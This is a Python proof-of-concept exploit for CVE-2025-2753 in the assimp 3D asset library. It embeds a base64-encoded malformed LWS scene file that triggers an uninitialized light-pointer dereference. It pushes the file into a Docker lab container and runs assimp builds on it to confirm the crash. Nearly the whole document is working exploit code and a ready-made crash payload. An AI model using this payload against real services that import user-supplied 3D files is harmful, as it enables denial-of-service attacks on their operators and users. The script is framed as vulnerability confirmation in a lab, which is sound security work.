#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Assimp LWS Importer Uninitialized Light Pointer Array (DoS/Info Leak)
# CVE            : CVE-2025-2753
# Vendor         : assimp (Open Source)
# Product        : Open Asset Import Library (assimp)
# Affected       : v5.4.3 through v6.0.4 (0-day, unfixed)
# Type           : CWE-457 - Use of Uninitialized Variable
# CVSS           : 6.3 (MEDIUM)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-2753 — Vector 1: Light Array Crash via Original Crash File

Feeds a 661-byte malformed LWS file (from GitHub issue #6014) to assimp's CLI
tool inside the lab container. The file triggers uninitialized pointer dereference
in CopyPtrArray<aiLight>() → SceneCombiner::Copy(aiLight) → SEGV.

ATTACK CHAIN:
  1. Malformed LWS file has AddLight keywords creating light array slots
  2. Garbled ParentObject references make light nodes unreachable from root
  3. BuildGraph fills only reachable slots — others contain heap garbage
  4. MergeScenes → CopyPtrArray dereferences uninitialized pointer → SEGV

PREREQUISITES:
  - Docker with cve-2025-2753-vulnerable container running
  - No external dependencies (stdlib only)

REFERENCES:
  - CVE-2025-2753
  - https://github.com/assimp/assimp/issues/6014
"""

import subprocess
import sys
import os
import base64
import tempfile

# The original PoC crash file from assimp GitHub issue #6014
# This 661-byte malformed LWS file contains:
# - LWSC header with garbled version field
# - Multiple AddLight keywords that increment num_light during parsing
# - Malformed ParentObject references creating unreachable light nodes
# - Binary garbage interspersed with valid keywords
# Result: num_light >= 2 after parsing, but only some light nodes are reachable
# during BuildGraph traversal, leaving uninitialized pointer slots
CRASH_LWS_B64 = (
    "TFdTQyBBDUFkZExpZ29tLzNkbQNodHRwbGliIFxcDUxvYWRPYmplY3QgMTExUyAgICAoIGMxGzFT"
    "aHQgQSQtIExvYWQ9YmplY3RMYXkgTG8yICBBJA1QYXJlbnRPYmplY3QgMgogMg04IDczCQkgMiA3"
    "Mw04IEEk8t+zkJ6bsJ2VmpyLs56Gmo3fz6zai9/y8vLy2t/N1/DyvpuR2dzEypeL39/f39fP8r6b"
    "m7OWmJeL5vLy8vLPziQkJF9fX3RQVGludCANDQ0NJSAyICBBJA1BZGRMaWdodCANDSBMb2FkT2Jq"
    "ZWN0TGF5ZXIgag1BZGRMaWdodCBBJC0gTG9hZE9iamVjdExheSBMbzIgIEEkDVBhcmVudE9iamVj"
    "dCANDQ0gQSQNf2RkTGlnaHQgDQ0gTG9hbW9tYWdpYy8NDQ0NDQ1MaWdodE1vdGlvbg0NA+gNDTAx"
    "JCQkX19fX19fJDoyCiAyDTggNzMJCSAyIDczDTggQSQNIExvYWRPYg1BZGRMIEEkDSBMb2FkT2Jq"
    "ZWN0TGF5ZXIgMFNiZWdpbk5hcCUgICBBJGRuJiM4IDczCQkgMCA3Mw04IDcgICAgMw04NSBNCQkJ"
    "CQoKOCA3ICAgICAgICAgICAgIC8vLy8x6CAgQSQNUGFyZW50T2JqZWN0IA0NDSAHEAA6Ojo6Ojqg"
    "eZrmXw0NDQ1MaWdodI15dGlvbg0NDQ0NDTAxJCQkX19fX19HJDoyCiAyDTggNzMJCSAyIDczDTgg"
    "QSTy37OQnpuwnZWanIuznoaajd/PrNqL3/LybnRPYmplY3QgDQ0NIDdlciAwUyUgdo15mgAKT0FN"
    "AAFjYbUgdCByc1kAAHVzZW10bCCbtbW1ABBNDAx2bGxsbHKP"
)


def check_docker_available():
    """Verify docker CLI is available."""
    try:
        subprocess.run(["docker", "version"], capture_output=True, timeout=10)
        return True
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def check_container_running(container_name):
    """Verify the target container is running."""
    try:
        result = subprocess.run(
            ["docker", "inspect", "-f", "{{.State.Running}}", container_name],
            capture_output=True, text=True, timeout=10
        )
        return result.stdout.strip() == "true"
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
        return False


def get_crash_file_bytes():
    """Decode the embedded crash LWS file."""
    return base64.b64decode(CRASH_LWS_B64)


def ensure_crash_file_in_container(container_name):
    """Ensure the crash.lws file exists inside the container at /opt/poc/crash.lws."""
    # Check if the file already exists in the container
    result = subprocess.run(
        ["docker", "exec", container_name, "test", "-f", "/opt/poc/crash.lws"],
        capture_output=True, timeout=10
    )
    if result.returncode == 0:
        return True

    # Copy it into the container
    crash_data = get_crash_file_bytes()
    with tempfile.NamedTemporaryFile(suffix=".lws", delete=False) as f:
        f.write(crash_data)
        tmp_path = f.name

    try:
        subprocess.run(
            ["docker", "exec", container_name, "mkdir", "-p", "/opt/poc"],
            capture_output=True, timeout=10
        )
        subprocess.run(
            ["docker", "cp", tmp_path, f"{container_name}:/opt/poc/crash.lws"],
            capture_output=True, timeout=10
        )
        return True
    finally:
        os.unlink(tmp_path)


def run_asan_test(container_name):
    """
    Test 1: ASan-instrumented build — produces detailed crash report.

    The ASan build fills uninitialized heap memory with 0xBE bytes (or similar sentinel).
    When the uninitialized pointer (e.g., 0xbebebebebebebebe or 0x17d7d7e7d7d7d7d7)
    is dereferenced in CopyPtrArray → Copy(aiLight), ASan reports a SEGV with a
    full stack trace showing the exact crash location.
    """
    print("=" * 70)
    print("[TEST 1] ASan Build — AddressSanitizer crash detection")
    print("=" * 70)
    print(f"  Container: {container_name}")
    print(f"  Binary:    /usr/local/bin/assimp-asan (ASan debug build)")
    print(f"  Input:     /opt/poc/crash.lws (661-byte malformed LWS)")
    print(f"  Expected:  SEGV on uninitialized pointer dereference")
    print()

    cmd = [
        "docker", "exec", container_name, "bash", "-c",
        "LD_LIBRARY_PATH=/opt/assimp/build-asan/bin "
        "assimp-asan info /opt/poc/crash.lws 2>&1; "
        "echo EXIT_CODE=$?"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        print("[!] Command timed out after 30 seconds")
        return False

    print("--- Output ---")
    print(output)
    print("--- End Output ---")
    print()

    # Parse results
    success = False
    indicators = {
        "asan_deadlysignal": "AddressSanitizer:DEADLYSIGNAL" in output,
        "asan_segv": "ERROR: AddressSanitizer: SEGV" in output,
        "uninit_addr": any(x in output for x in [
            "0xbebebebebebebebe",    # ASan fill pattern (x86-64)
            "0x17d7d7e7d7d7d7d7",   # ASan fill pattern (aarch64)
            "unknown address"
        ]),
        "crash_in_aistring": "aiString::operator=" in output,
        "crash_in_copy_light": "SceneCombiner::Copy(aiLight**" in output
                               or "Copy(aiLight" in output,
        "crash_in_copyptrarray": "CopyPtrArray<aiLight>" in output
                                 or "CopyPtrArray" in output,
        "crash_in_lws": "LWSImporter::InternReadFile" in output,
        "nonzero_exit": "EXIT_CODE=1" in output or "EXIT_CODE=139" in output,
    }

    print("[*] Crash indicators:")
    for name, found in indicators.items():
        status = "FOUND" if found else "not found"
        print(f"    {name}: {status}")
    print()

    # Vulnerability is confirmed if ASan reports SEGV with the expected stack trace
    if indicators["asan_segv"] and indicators["crash_in_copyptrarray"]:
        print("[+] VULNERABILITY CONFIRMED via ASan SEGV report")
        print("    Root cause: Uninitialized aiLight* pointer dereferenced in CopyPtrArray")
        success = True
    elif indicators["nonzero_exit"]:
        print("[+] Process crashed (non-zero exit)")
        success = True
    else:
        print("[-] Unexpected result — crash not detected")

    return success


def run_release_test(container_name):
    """
    Test 2: Standard debug build — produces raw SIGSEGV (exit code 139).

    Without ASan, the uninitialized pointer contains arbitrary heap garbage.
    Dereferencing it causes a SIGSEGV which the kernel delivers to the process.
    Exit code 128 + 11 (SIGSEGV) = 139.
    """
    print()
    print("=" * 70)
    print("[TEST 2] Release Build — SIGSEGV crash detection")
    print("=" * 70)
    print(f"  Container: {container_name}")
    print(f"  Binary:    /usr/local/bin/assimp-release (standard debug build)")
    print(f"  Input:     /opt/poc/crash.lws (661-byte malformed LWS)")
    print(f"  Expected:  Segmentation fault (exit code 139)")
    print()

    cmd = [
        "docker", "exec", container_name, "bash", "-c",
        "LD_LIBRARY_PATH=/opt/assimp/build-release/bin "
        "assimp-release info /opt/poc/crash.lws 2>&1; "
        "echo EXIT_CODE=$?"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        print("[!] Command timed out after 30 seconds")
        return False

    print("--- Output ---")
    print(output)
    print("--- End Output ---")
    print()

    # Check for SIGSEGV (exit code 139 = 128 + 11)
    if "EXIT_CODE=139" in output:
        print("[+] VULNERABILITY CONFIRMED — SIGSEGV (exit code 139)")
        print("    Process crashed due to uninitialized pointer dereference")
        return True
    elif "Segmentation fault" in output:
        print("[+] VULNERABILITY CONFIRMED — Segmentation fault detected")
        return True
    elif "EXIT_CODE=134" in output:
        print("[+] VULNERABILITY CONFIRMED — SIGABRT (exit code 134)")
        print("    Process aborted (may indicate memory corruption detection)")
        return True
    elif "EXIT_CODE=0" in output:
        print("[-] Process exited normally — vulnerability NOT triggered")
        return False
    else:
        print(f"[-] Unexpected exit. Output: {output.strip()}")
        return False


def exploit(container_name):
    """
    CVE-2025-2753 PoC — Uninitialized Light Pointer Array in assimp LWS Importer.

    Attack flow:
    1. The malformed crash.lws file is fed to assimp's file import pipeline
    2. LWSLoader::InternReadFile() parses the file:
       a. Counts AddLight keywords → allocates mLights = new aiLight*[num_light]
       b. Array is NOT zero-initialized (no trailing () on new[])
    3. BuildGraph() traverses scene graph from roots:
       a. Only light nodes reachable from root nodes get slots filled
       b. Light nodes with resolved parents in circular/unreachable subgraphs
          are never visited → their array slots remain uninitialized (heap garbage)
    4. SceneCombiner::MergeScenes() → CopySceneFlat() → CopyScene()
       → CopyPtrArray<aiLight>() iterates ALL num_light slots
    5. SceneCombiner::Copy(aiLight**, aiLight const*) dereferences the
       garbage pointer (e.g., 0xbebebebebebebebe under ASan) in aiString::operator=()
    6. SEGV — application crashes
    """
    print()
    print("CVE-2025-2753 — Uninitialized Pointer Array in assimp LWS Importer")
    print("Affected: Open Asset Import Library (assimp) v5.4.3")
    print("CWE: CWE-457 (Use of Uninitialized Variable), CWE-125 (OOB Read)")
    print(f"Target container: {container_name}")
    print()

    # Pre-checks
    if not check_docker_available():
        print("[!] ERROR: docker CLI not available")
        return False

    if not check_container_running(container_name):
        print(f"[!] ERROR: Container '{container_name}' is not running")
        print("    Start the lab with:")
        print("    docker compose up -d")
        return False

    # Ensure crash file is available
    ensure_crash_file_in_container(container_name)

    # Run both tests
    asan_result = run_asan_test(container_name)
    release_result = run_release_test(container_name)

    # Summary
    print()
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"  ASan build test:    {'CONFIRMED' if asan_result else 'FAILED'}")
    print(f"  Release build test: {'CONFIRMED' if release_result else 'FAILED'}")
    print()

    if asan_result or release_result:
        print("[+] CVE-2025-2753 CONFIRMED — Vulnerability successfully demonstrated")
        print()
        print("    The assimp LWS importer allocates aiLight* pointer arrays without")
        print("    zero-initialization. Malformed LWS files can create unreachable")
        print("    light nodes, leaving uninitialized pointer slots that are later")
        print("    dereferenced during scene merging, causing a crash (DoS).")
        return True
    else:
        print("[-] Could not confirm vulnerability")
        return False


if __name__ == "__main__":
    container = sys.argv[1] if len(sys.argv) > 1 else "cve-2025-2753-vulnerable"
    success = exploit(container)
    sys.exit(0 if success else 1)
